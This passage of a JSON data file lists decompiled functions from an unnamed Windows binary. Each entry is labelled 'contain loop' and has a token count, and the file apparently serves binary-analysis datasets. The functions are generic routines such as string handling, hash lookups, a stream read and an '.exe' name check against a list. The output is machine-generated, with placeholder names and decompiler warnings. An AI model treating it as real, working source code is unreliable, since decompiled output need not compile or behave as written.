        "decompiled_code": "\nuint __cdecl fcn.0040279a(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = 0;\n    iVar2 = 0;\n    do {\n        if (*(arg_ch + iVar2 * 4) != *(iVar2 * 4 + 0x4129c0)) goto code_r0x004027c0;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 4);\ncode_r0x004027ce:\n    *arg_10h = arg_8h;\n    LOCK();\n    *(arg_8h + 4) = *(arg_8h + 4) + 1;\n    return 0;\ncode_r0x004027c0:\n    do {\n        if (*(arg_ch + iVar1 * 4) != *(iVar1 * 4 + 0x40f8f0)) {\n            return 0x80004002;\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 4);\n    goto code_r0x004027ce;\n}\n",
        "token_count": 261
    },
    "00402c39": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402c39(int32_t arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    char16_t *arg_ch;\n    \n    arg_ch = L\".exe\";\n    arg_8h_00 = fcn.00406a50(arg_8h);\n    iVar1 = fcn.00406eda(arg_8h_00, arg_ch);\n    if (iVar1 != 0) {\n        *(arg_8h + (iVar1 - arg_8h >> 1) * 2) = 0;\n        for (puVar2 = *0x421650; puVar2 != NULL; puVar2 = puVar2[1]) {\n            iVar1 = fcn.004067b6(*puVar2, arg_8h);\n            if (iVar1 != 0) {\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 215
    },
    "00405228": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405228(int32_t arg_8h, uchar *arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        arg_8h = arg_8h - arg_ch;\n        do {\n            arg_ch[arg_8h] = *arg_ch;\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "00405823": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405823(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 1;\n    arg_8h_00 = fcn.00405197(2);\n    while( true ) {\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        iVar1 = (**0x413c04)(arg_8h, arg_8h_00, iVar2);\n        *arg_ch = iVar1;\n        if (iVar1 != iVar2) break;\n        fcn.004051e4(arg_8h_00);\n        iVar2 = iVar2 + 1;\n        arg_8h_00 = fcn.00405197(iVar2 * 2);\n    }\n    if (iVar1 != 0) {\n        return arg_8h_00;\n    }\n    fcn.004051e4(arg_8h_00);\n    return 0;\n}\n",
        "token_count": 238
    },
    "00406256": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00406256(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_1h;\n    \n    uVar3 = 0;\n    if (arg_ch != 0) {\n        do {\n            uVar2 = 0;\n            uVar4 = 0;\n            do {\n                iVar1 = fcn.0040629f(&var_1h);\n                if (iVar1 == 0) {\n                    return 0;\n                }\n                var_1h._0_1_ = in_ECX >> 0x18;\n                uVar2 = uVar2 | var_1h << (uVar4 & 0x1f);\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < 8);\n            *(uVar3 + arg_8h) = uVar2;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg_ch);\n    }\n    return 1;\n}\n",
        "token_count": 285
    },
    "00406349": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00406349(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    (**0x413cc0)(1);\n    iVar1 = (**0x413c34)();\n    do {\n        (**0x413e10)(1);\n        iVar2 = (**0x413c34)();\n    } while (iVar1 == iVar2);\n    return;\n}\n",
        "token_count": 85
    },
    "004068a3": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004068a3(uint8_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    \n    puVar3 = arg_8h;\n    do {\n        uVar1 = *arg_8h;\n        *puVar3 = uVar1;\n        uVar2 = fcn.004066e6(in_EAX & 0xffffff00 | uVar1);\n        if (uVar2 == 0) {\n            puVar3 = puVar3 + 1;\n        }\n        uVar1 = *arg_8h;\n        in_EAX = uVar2 & 0xffffff00;\n        arg_8h = arg_8h + 1;\n    } while (uVar1 != 0);\n    return;\n}\n",
        "token_count": 193
    },
    "00406b15": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00406b15(char *arg_8h, uint arg_ch)\n\n{\n    while( true ) {\n        if (*arg_8h == '\\0') {\n            if (arg_ch != '\\0') {\n                arg_8h = NULL;\n            }\n            return arg_8h;\n        }\n        if (*arg_8h == arg_ch) break;\n        arg_8h = arg_8h + 1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 108
    },
    "00406b58": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406b58(char *arg_8h, char *arg_ch)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    \n    cVar2 = *arg_ch;\n    iVar1 = *arg_8h - cVar2;\n    if (iVar1 == 0) {\n        iVar3 = arg_8h - arg_ch;\n        do {\n            if (cVar2 == '\\0') break;\n            arg_ch = arg_ch + 1;\n            cVar2 = *arg_ch;\n            iVar1 = arg_ch[iVar3] - cVar2;\n        } while (iVar1 == 0);\n    }\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    else if (0 < iVar1) {\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 196
    },
    "00406e31": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00406e31(char *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    \n    pcVar3 = arg_8h;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    do {\n        pcVar3 = pcVar3 + -1;\n        if (pcVar3 == arg_8h) break;\n    } while (*pcVar3 != arg_ch);\n    pcVar2 = NULL;\n    if (*pcVar3 == arg_ch) {\n        pcVar2 = pcVar3;\n    }\n    return pcVar2;\n}\n",
        "token_count": 167
    },
    "00407229": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407229(int32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    uVar1 = fcn.004065e5(arg_ch);\n    puVar3 = *(*(arg_8h + 8) + (uVar1 % *(arg_8h + 4)) * 4);\n    while( true ) {\n        if (puVar3 == NULL) {\n            return 0;\n        }\n        iVar2 = fcn.00406b58(*puVar3, arg_ch);\n        if (iVar2 == 0) break;\n        puVar3 = puVar3[2];\n    }\n    return 1;\n}\n",
        "token_count": 167
    },
    "00407267": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407267(int32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    uVar1 = fcn.00406603(arg_ch);\n    iVar3 = *(*(arg_8h + 8) + (uVar1 % *(arg_8h + 4)) * 4);\n    while( true ) {\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.00406b9a(*(iVar3 + 4), arg_ch);\n        if (iVar2 == 0) break;\n        iVar3 = *(iVar3 + 8);\n    }\n    return 1;\n}\n",
        "token_count": 168
    },
    "004072a6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004072a6(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    \n    iVar2 = fcn.00405156(arg_ch);\n    uVar3 = 0;\n    *arg_8h = iVar2;\n    if (iVar2 != 0) {\n        do {\n            puVar1 = uVar3 * 4 + 0x413b80;\n            if (arg_10h <= *puVar1 && *puVar1 != arg_10h) {\n                piVar4 = *(uVar3 * 4 + 0x413b80);\n                break;\n            }\n            uVar3 = uVar3 + 1;\n            piVar4 = arg_8h;\n        } while (uVar3 < 0x1a);\n        arg_8h[1] = piVar4;\n        iVar2 = fcn.00405139(iVar2, piVar4 << 2);\n        arg_8h[2] = iVar2;\n        if (iVar2 == 0) {\n            fcn.00405173(*arg_8h);\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = 1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 318
    },
    "004087ed": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004087ed(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_54h;\n    int32_t var_4ch;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    arg_8h_00 = 0;\n    var_4h = NULL;\n    iVar1 = (**0x413c30)(0, 1, &var_4h);\n    if (iVar1 == 0) {\n        while ((iVar1 = (**0x413dc4)(arg_8h, &var_8h),  iVar1 != 0 && (var_8h != 0))) {\n            iVar1 = fcn.00405197(var_8h);\n            if (iVar1 != 0) {\n                var_ch = 0;\n                iVar2 = (**0x413d3c)(arg_8h, iVar1, var_8h, &var_ch);\n                if (iVar2 != 0) {\n                    (**(*var_4h + 0x10))(var_4h, iVar1, var_ch, 0);\n                }\n                fcn.004051e4(iVar1);\n            }\n        }\n        iVar1 = (**(*var_4h + 0x30))(var_4h, &var_54h, 1);\n        if ((iVar1 == 0) &&\n           (((var_4ch != 0 && (iVar1 = (**(*var_4h + 0x14))(var_4h, 0, 0, 0, 0),  iVar1 == 0)) &&\n            (arg_8h_00 = fcn.00405197(var_4ch),  arg_8h_00 != 0)))) {\n            *arg_ch = var_4ch;\n            iVar1 = (**(*var_4h + 0xc))(var_4h, arg_8h_00, var_4ch, &var_ch);\n            if (iVar1 != 0) {\n                fcn.004051e4(arg_8h_00);\n                arg_8h_00 = 0;\n            }\n        }\n        (**(*var_4h + 8))(var_4h);\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 537
    },
    "0040af5c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040af5c(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    \n    iVar5 = 10;\n    puVar4 = arg_8h;\n    do {\n        uVar1 = *((arg_ch - arg_8h) + puVar4);\n        uVar2 = *puVar4;\n        iVar3 = *((arg_ch - arg_8h) + 4 + puVar4);\n        *puVar4 = uVar1 - *puVar4;\n        puVar4[1] = (iVar3 - puVar4[1]) - (uVar1 < uVar2);\n        iVar5 = iVar5 + -1;\n        puVar4 = puVar4 + 2;\n    } while (iVar5 != 0);\n    return;\n}\n",
        "token_count": 217
    },
    "0040db7c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040db7c(int32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (arg_ch != NULL) {\n        *arg_ch = 0;\n        do {\n            iVar1 = arg_ch[1];\n            if (iVar1 == 1) {\n                if (arg_ch[2] == 0) goto code_r0x0040dbbc;\n                iVar1 = arg_ch[2] + -1;\n                arg_ch[2] = iVar1;\n                puVar2 = *(iVar1 * 0xc + 8 + arg_ch[3]);\n            }\n            else {\n                if (iVar1 == 2) {\n                    if (arg_ch[2] != 0) {\n                        iVar1 = arg_ch[2] + -1;\n                        arg_ch[2] = iVar1;\n                        puVar2 = *(arg_ch[3] + iVar1 * 4);\n                        goto code_r0x0040dbda;\n                    }\ncode_r0x0040dbbc:\n                    (**(arg_8h + 0xc))(arg_ch[3]);\n                }\n                else if (iVar1 == 5) goto code_r0x0040dbbc;\n                puVar2 = *arg_ch;\n                (**(arg_8h + 0xc))(arg_ch);\n            }\ncode_r0x0040dbda:\n            arg_ch = puVar2;\n        } while (puVar2 != NULL);\n    }\n    return;\n}\n",
        "token_count": 335
    }
}